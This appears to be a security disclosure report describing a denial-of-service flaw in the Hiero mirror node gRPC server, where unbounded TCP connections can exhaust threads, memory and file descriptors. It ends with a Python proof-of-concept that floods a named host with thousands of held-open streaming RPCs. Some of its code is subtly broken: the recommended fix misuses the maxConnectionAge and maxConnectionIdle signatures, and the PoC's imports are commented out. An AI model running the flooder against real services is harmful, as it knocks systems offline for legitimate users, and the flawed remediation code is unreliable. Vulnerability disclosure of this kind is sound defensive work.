### Title
Unbounded gRPC Connection Acceptance Enables Thread Pool and Resource Exhaustion DoS

### Summary
The `grpcServerConfigurer` bean in `GrpcConfiguration` configures the Netty gRPC server with only a per-connection call limit (`maxConcurrentCallsPerConnection = 5`) but imposes no limit on the total number of accepted TCP connections. An unauthenticated attacker can open an unbounded number of connections — each contributing up to 5 concurrent streaming RPCs — saturating the shared `applicationTaskExecutor` thread pool and exhausting OS-level resources (file descriptors, heap memory), causing a complete denial-of-service for all legitimate subscribers.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35, bean `grpcServerConfigurer`:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause:** `NettyServerBuilder` exposes `maxConnections(int)` to cap the total number of simultaneously accepted TCP connections, but this method is never called. The only guard applied is `maxConcurrentCallsPerConnection(5)`, which is a *per-connection* limit. With N connections open, the server accepts up to 5N concurrent streaming calls, all dispatched to the single shared `applicationTaskExecutor`.

**No authentication or rate limiting exists in the gRPC layer.** The only registered `ServerInterceptor` (`grpc/src/test/java/org/hiero/mirror/grpc/interceptor/GrpcInterceptor.java`) only sets an `EndpointContext` for table-usage tracking — it performs no authentication, no IP-based throttling, and no connection counting. The `web3` module has a `ThrottleManagerImpl` with bucket4j rate limiting, but no equivalent exists in the `grpc` module.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600 (default gRPC port) with no credentials required.
2. On each connection, attacker sends 5 `subscribeTopic` streaming RPCs (the per-connection maximum).
3. Each RPC call is dispatched as a task to `applicationTaskExecutor` (Spring Boot's `ThreadPoolTaskExecutor`, default unbounded queue capacity `Integer.MAX_VALUE`).
4. With N = 10,000 connections: 50,000 tasks are queued/active. The queue grows without bound, consuming heap until OOM, or the thread pool is fully occupied serving attacker streams.
5. Legitimate subscriber RPCs are either rejected (if file descriptors are exhausted) or starved indefinitely in the executor queue.

**Why the existing check fails:** `maxConcurrentCallsPerConnection(5)` is a *per-connection* guard enforced by Netty's HTTP/2 `MAX_CONCURRENT_STREAMS` setting. It does not bound the product `connections × calls_per_connection`. With no `maxConnections()` call on the builder, Netty's default is effectively unbounded (limited only by OS file descriptor limits, typically 65535 per process).

### Impact Explanation
- **Thread pool exhaustion:** All `applicationTaskExecutor` threads are occupied by attacker-controlled long-lived streaming subscriptions. New legitimate RPC dispatches queue indefinitely.
- **Memory exhaustion:** Each open Netty channel holds buffers; 10,000+ channels consume hundreds of MB. The unbounded executor queue accumulates `Runnable` objects, accelerating heap exhaustion and triggering OOM.
- **File descriptor exhaustion:** Each TCP connection consumes one FD. At the OS default limit (~65535), no new connections — including health checks and internal traffic — can be accepted.
- **Severity: High.** Complete service unavailability for all legitimate subscribers with no self-recovery until attacker connections are dropped.

### Likelihood Explanation
- **No privileges required.** The gRPC port is publicly accessible with zero authentication.
- **Trivially scriptable.** A single machine can open thousands of TCP connections using standard gRPC client libraries (e.g., `grpc-java`, `grpcurl`, Python `grpcio`) in a loop.
- **Persistent.** `subscribeTopic` is a server-streaming RPC that stays open indefinitely (no server-side timeout is configured for idle streams). Attacker connections persist without sending any further data.
- **Repeatable.** After a server restart, the attack can be immediately re-launched.

### Recommendation
1. **Add a total connection limit** in `GrpcConfiguration.grpcServerConfigurer()`:
   ```java
   serverBuilder.maxConnectionAge(Duration.ofMinutes(10), TimeUnit.MILLISECONDS);
   serverBuilder.maxConnectionIdle(Duration.ofMinutes(2), TimeUnit.MILLISECONDS);
   // Requires grpc-netty ≥ 1.38 or use NettyServerBuilder directly:
   // serverBuilder.maxConnections(1000);
   ```
2. **Add `maxConnections` to `NettyProperties`** and wire it in `GrpcConfiguration`, e.g. `maxConnections = 1000`.
3. **Add a gRPC-layer rate limiter** (bucket4j or Resilience4j) as a `ServerInterceptor` that limits RPCs per source IP per second, analogous to `ThrottleManagerImpl` in the `web3` module.
4. **Set `maxConnectionAge` and `maxConnectionIdle`** to force periodic connection recycling, preventing indefinite stream holding.
5. **Deploy an external L4/L7 rate limiter** (e.g., Envoy, Traefik circuit breaker already partially configured in `charts/hedera-mirror-grpc/values.yaml`) that enforces per-IP connection and RPS limits before traffic reaches the JVM.

### Proof of Concept
```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# Proto-generated stub for hiero mirror gRPC
# from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2

TARGET = "mirror-node-host:5600"
NUM_CONNECTIONS = 5000  # open 5000 independent channels
CALLS_PER_CONN = 5      # saturate maxConcurrentCallsPerConnection

def flood_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    streams = []
    for _ in range(CALLS_PER_CONN):
        req = consensus_service_pb2.ConsensusTopicQuery()
        req.topicID.topicNum = 1
        # Open streaming RPC and hold it open
        stream = stub.subscribeTopic(req)
        streams.append(stream)
    # Block forever, keeping all streams and the channel open
    threading.Event().wait()

with ThreadPoolExecutor(max_workers=NUM_CONNECTIONS) as pool:
    list(pool.map(flood_connection, range(NUM_CONNECTIONS)))

# Expected result: server applicationTaskExecutor saturated with 25,000 tasks,
# file descriptors exhausted, legitimate subscribers receive UNAVAILABLE or hang.
```